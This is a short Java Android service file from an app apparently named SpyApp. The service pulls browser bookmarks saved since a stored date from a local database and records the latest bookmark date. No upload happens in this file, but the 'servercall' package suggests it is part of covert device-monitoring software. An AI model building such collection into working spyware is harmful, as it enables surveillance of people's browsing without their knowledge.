package com.app.spyapp.servercall;

import android.app.IntentService;
import android.content.Intent;
import android.util.Log;

import com.app.spyapp.SpyApp;
import com.app.spyapp.common.Const;
import com.app.spyapp.common.Pref;
import com.app.spyapp.model.BrowserModel;

import java.util.ArrayList;


public class BookMarkCallService extends IntentService {

    private SpyApp spyApp;

    public BookMarkCallService() {
        super(BookMarkCallService.class.getSimpleName());
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        spyApp = (SpyApp) getApplicationContext();
        ArrayList<BrowserModel> bookmarkList = spyApp.getDatabaseHelper().getBookmarkList(spyApp.getSharedPreferences().getString(Pref.BOOKMARK_LAST_UPDATEDATE, Const.INITDATETIME));
        spyApp.getSharedPreferences().edit().putString(Pref.BOOKMARK_LAST_UPDATEDATE, spyApp.getDatabaseHelper().getMaxDateofBookmark()).apply();
        Log.i("Debug", "onHandleIntent: BookmarkCallService");
    }
}
